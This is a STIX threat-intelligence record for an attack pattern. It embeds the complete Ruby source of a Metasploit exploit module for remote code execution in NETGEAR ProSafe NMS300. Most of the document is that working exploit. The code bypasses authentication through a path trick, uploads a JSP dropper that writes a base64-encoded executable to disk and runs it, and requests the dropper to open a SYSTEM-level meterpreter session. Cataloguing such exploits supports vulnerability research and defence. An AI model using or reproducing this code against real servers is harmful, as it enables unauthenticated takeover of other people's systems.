{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8bfa6fb9-38b1-4d42-8dd2-bfc013ead4d6",
    "created": "2024-08-14T16:52:40.908405Z",
    "modified": "2024-08-14T16:52:40.90841Z",
    "name": "NETGEAR ProSafe Network Management System 300 Arbitrary File Upload",
    "description": " Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems. The application has multiple vulnerabilities that can allow an unauthenticated remote attacker to execute code as SYSTEM user. Vulnerabilities include authentication bypass SQL injection, arbitrary file upload, and privilege escalation across various versions. This module is able to spawn a meterpreter session by chaining together two specific vulnerabilities inside the FileUploadController and MyHandlerInterceptor classes. This module has been tested with versions 1.5.0.2, 1.4.0.17, 1.1.0.13, 1.7.0.12, and 1.7.0.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/netgear_nms_rce.rb",
            "external_id": "netgear_nms_rce.rb"
        },
        {
            "source_name": "EgeBALCI<egebalciatpm.me>",
            "external_id": "#MsfmoduleupdateforCVE-2023-38096andCVE-2023-38098"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-38096"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-38098"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1525"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Feb/30"
        },
        {
            "source_name": "reference",
            "url": "https://kb.netgear.com/000065707/Security-Advisory-for-Multiple-Vulnerabilities-on-the-ProSAFE-Network-Management-System-PSV-2023-0024-PSV-2023-0025"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NETGEAR ProSafe Network Management System 300 Arbitrary File Upload',\n        'Description' => %q{\n          Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.\n          The application has multiple vulnerabilities that can allow an unauthenticated remote\n          attacker to execute code as SYSTEM user. Vulnerabilities include authentication bypass,\n          SQL injection, arbitrary file upload, and privilege escalation across various versions.\n          This module is able to spawn a meterpreter session by chaining together two specific\n          vulnerabilities inside the FileUploadController and MyHandlerInterceptor classes.\n          This module has been tested with versions 1.5.0.2, 1.4.0.17, 1.1.0.13, 1.7.0.12, and 1.7.0.1.\n        },\n        'Author' => [\n          'Ege BALCI <egebalci[at]pm.me>', # Msf module update for CVE-2023-38096 and CVE-2023-38098\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability discovery and updated MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['ZDI', '23-920'],\n          ['ZDI', '23-918'],\n          ['CVE', '2023-38096'],\n          ['CVE', '2023-38098'],\n          ['CVE', '2016-1525'],\n          ['US-CERT-VU', '777024'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear_nms_rce.txt'],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Feb/30'],\n          ['URL', 'https://kb.netgear.com/000065707/Security-Advisory-for-Multiple-Vulnerabilities-on-the-ProSAFE-Network-Management-System-PSV-2023-0024-PSV-2023-0025'],\n        ],\n        'DefaultOptions' => { 'WfsDelay' => 5 },\n        'Platform' => ['win'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [ 'NETGEAR ProSafe Network Management System 300 / Windows', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2016-02-04',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Application path', '/'])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'userSession.do/../fileUpload.do'),\n      'method' => 'POST',\n      'vars_get' => { 'method' => 'loginHtml' } # This is required for auth bypass above v1.5.0.11\n    })\n    if res && res.code == 200 # if this endpoint returns 200 than we can exploit all targets\n      Exploit::CheckCode::Detected\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def generate_jsp_payload\n    exe = generate_payload_exe\n    base64_exe = Rex::Text.encode_base64(exe)\n    payload_name = rand_text_alpha(rand(3..8))\n\n    var_raw = 'a' + rand_text_alpha(rand(3..10))\n    var_ostream = 'b' + rand_text_alpha(rand(3..10))\n    var_buf = 'c' + rand_text_alpha(rand(3..10))\n    var_decoder = 'd' + rand_text_alpha(rand(3..10))\n    var_tmp = 'e' + rand_text_alpha(rand(3..10))\n    var_path = 'f' + rand_text_alpha(rand(3..10))\n    var_proc2 = 'e' + rand_text_alpha(rand(3..10))\n\n    jsp = %|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{payload_name}\", \".exe\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp.gsub!(/[\\n\\t\\r]/, '')\n\n    return jsp\n  end\n\n  def exploit\n    jsp_payload = generate_jsp_payload\n\n    rand_name = Rex::Text.rand_text_alpha(rand(8..15))\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('topology', nil, nil, 'form-data; name=\"type\"')\n    post_data.add_part(jsp_payload,\n                       'application/octet-stream', 'binary',\n                       \"form-data; name=\\\"FileData\\\"; filename=\\\"#{rand_name}.jsp\\\"\")\n    data = post_data.to_s\n\n    print_status(\"#{peer} - Uploading payload...\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'userSession.do/../fileUpload.do'),\n      'method' => 'POST',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'vars_get' => {\n        'method' => 'loginHtml',\n        'format' => 'jsp'\n      }\n    })\n    if res && res.code == 200 && res.get_json_document['success']\n      print_good(\"#{peer} - Payload uploaded successfully\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")\n    end\n\n    payload_name = res.get_json_document['file']\n    if payload_name.empty?\n      fail_with(Failure::Unknown, \"#{peer} - Unexpected upload response\")\n    end\n\n    print_status(\"#{peer} - Executing payload...\")\n    send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], \"lib-1.0/external/flash/topology/map/#{payload_name}\"),\n      'method' => 'GET'\n    })\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-04",
    "x_mitre_platforms": [
        "['win']"
    ]
}